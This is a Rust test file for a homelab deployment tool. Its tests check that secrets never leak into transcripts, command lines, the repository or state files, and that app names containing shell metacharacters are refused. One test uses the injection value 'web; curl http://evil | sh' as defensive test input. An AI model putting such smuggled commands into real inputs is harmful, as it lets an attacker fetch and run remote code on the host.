//! Standing rule 10: secrets never in git, argv, logs, state or transcripts
//! — and these tests ASSERT it. A deploy runs with a planted secret; every
//! observable surface is scanned for the plaintext.

use homelab_core::executor::{CmdOutput, MockExecutor};
use homelab_core::manifest::*;
use homelab_core::ops::deploy::deploy;
use homelab_core::ops::OpCtx;
use homelab_core::runner::NullJournal;
use homelab_core::safety::SafetyConfig;
use homelab_core::sink::VecSink;

const SECRET: &str = "PLANTED_SECRET_hunter2_do_not_leak";
const OLD_SECRET: &str = "OLD_PLANTED_SECRET_previous_value";

fn spec_with_secret() -> DeploySpec {
    let manifest = StackManifest {
        registry_login: None,
        retention: None,
        data_mounts: Vec::new(),
        native_only: false,
        natives: Vec::new(),
        stack_name: "test".into(),
        vmid: 108,
        hostname: "108-app-test".into(),
        network: NetworkSpec {
            ip: "10.10.10.8/24".into(),
            gateway: "10.10.10.1".into(),
            bridge: "vmbr0".into(),
            vlan: Some(10),
        },
        resources: ResourceSpec {
            cores: 1,
            memory_mb: 512,
            swap_mb: 256,
            disk_gb: 4,
            storage: "local-lvm".into(),
        },
        lxc: LxcSpec {
            template: "debian-12".into(),
            unprivileged: true,
            features: "nesting=1".into(),
            protection: false,
            gpu: false,
            vpn: false,
        },
        boot: BootSpec {
            onboot: true,
            order: Some(50),
        },
        storage: vec![],
        apps: vec!["app".into()],
    };
    let mut env = std::collections::BTreeMap::new();
    env.insert("app".into(), format!("API_KEY={}\n", SECRET));
    DeploySpec {
        manifest,
        files: vec![FileBlob {
            path: "app/docker-compose.yml".into(),
            content: "services: {}".into(),
            mode: None,
        }],
        env,
        gateway_route: None,
        checks: Default::default(),
    }
}

async fn run_deploy(exec: &MockExecutor, sink: &VecSink) -> homelab_core::runner::OperationReport {
    exec.respond_always("qm status", CmdOutput::failed(2, "no such vm"));
    exec.enqueue("pct config", CmdOutput::failed(2, "does not exist"));
    exec.respond_always("pct status", CmdOutput::ok("status: running"));
    exec.respond_always("is-system-running", CmdOutput::ok("running"));
    exec.respond_always("docker --version", CmdOutput::ok("Docker 27"));
    exec.respond_always("ps --status running --services", CmdOutput::ok("app\n"));
    // A PREVIOUS secret already lives in the container. The idempotency
    // compare must be hash-based; if any code path ever cats the file, the
    // mock feeds the old plaintext straight into the transcript scanner.
    exec.respond_always(
        "cat '/opt/test/app/.env'",
        CmdOutput::ok(&format!("API_KEY={}\n", OLD_SECRET)),
    );
    exec.respond_always(
        "sha256sum '/opt/test/app/.env'",
        CmdOutput::ok("0123456789abcdef_old_env_hash\n"),
    );
    let j = NullJournal;
    let ctx = OpCtx {
        exec,
        sink,
        journal: &j,
        safety: SafetyConfig::default(),
        state_dir: "/var/lib/homelab".into(),
        now_unix: 1_760_000_000,
        metrics_targets_dir: None,
        grafana_dashboards_dir: None,
        homepage_services_file: None,
        kuma_monitors_file: None,
        asker: &homelab_core::ask::NOBODY,
        backup: Default::default(),
        registry_cache: None,
    };
    deploy(&ctx, &spec_with_secret()).await
}

#[tokio::test]
async fn r10_secret_never_in_transcript_events() {
    let exec = MockExecutor::new();
    let sink = VecSink::new();
    let report = run_deploy(&exec, &sink).await;
    assert!(report.ok, "{:?}", report.error);
    for line in sink.lines() {
        assert!(
            !line.contains(SECRET) && !line.contains(OLD_SECRET),
            "secret leaked into transcript/incident events: {}",
            line
        );
    }
}

#[tokio::test]
async fn r10_secret_never_in_argv() {
    let exec = MockExecutor::new();
    let sink = VecSink::new();
    run_deploy(&exec, &sink).await;
    for call in exec.calls() {
        assert!(
            !call.contains(SECRET) && !call.contains(OLD_SECRET),
            "secret leaked into a command line: {}",
            call
        );
    }
}

#[tokio::test]
async fn r10_secret_only_in_vault_and_push_tmp_never_in_repo_or_state() {
    let exec = MockExecutor::new();
    let sink = VecSink::new();
    let report = run_deploy(&exec, &sink).await;
    assert!(report.ok, "{:?}", report.error);
    let mut vault_seen = false;
    for path in exec.file_paths() {
        let content = exec.file(&path).unwrap_or_default();
        let has_secret = content.contains(SECRET);
        let allowed = path.starts_with("/var/lib/homelab/secrets/")
            || path.starts_with("/var/lib/homelab/push-staging");
        if has_secret {
            assert!(allowed, "secret written outside the vault: {}", path);
        }
        if path.starts_with("/var/lib/homelab/secrets/") {
            vault_seen = has_secret || vault_seen;
        }
        if path.contains("/repo/") || path.ends_with("state.json") {
            assert!(!has_secret, "secret in git repo or state: {}", path);
        }
    }
    assert!(
        vault_seen,
        "positive control: the vault must hold the secret"
    );
}

/// Security finding 1 (2026-08-11): app names reach `sh -c` strings inside
/// the target container, and D11 bundle import copies them verbatim from
/// untrusted files. The validator must therefore refuse shell metacharacters
/// in app names — for EVERY manifest-bearing op, not just deploy.
#[tokio::test]
async fn sec1_shell_metachar_app_name_refused_everywhere() {
    use homelab_core::ops::backup::{backup, restore, BackupCfg};
    use homelab_core::ops::update::update;
    let mut m = spec_with_secret().manifest;
    m.apps = vec!["web; curl http://evil | sh".into()];
    // validate_manifest refuses directly…
    assert!(homelab_core::manifest::validate_manifest(&m).is_err());
    // …and each op refuses before any command reaches a shell.
    let sink = VecSink::new();
    let j = NullJournal;
    for op in ["backup", "restore", "update"] {
        let exec = MockExecutor::new();
        exec.respond_always("pct config 108", CmdOutput::ok("hostname: 108-app-test\n"));
        let ctx = OpCtx {
            exec: &exec,
            sink: &sink,
            journal: &j,
            safety: SafetyConfig::default(),
            state_dir: "/var/lib/homelab".into(),
            now_unix: 1_760_000_000,
            metrics_targets_dir: None,
            grafana_dashboards_dir: None,
            homepage_services_file: None,
            kuma_monitors_file: None,
            asker: &homelab_core::ask::NOBODY,
            backup: Default::default(),
            registry_cache: None,
        };
        let r = match op {
            "backup" => backup(&ctx, &m, &BackupCfg::default()).await,
            "restore" => restore(&ctx, &m, &BackupCfg::default(), "latest").await,
            _ => update(&ctx, &m, None, false).await,
        };
        assert!(!r.ok, "{} must refuse a shell-metachar app name", op);
        assert!(
            exec.calls_containing("curl http://evil").is_empty(),
            "{}: injected command reached a shell",
            op
        );
    }
}
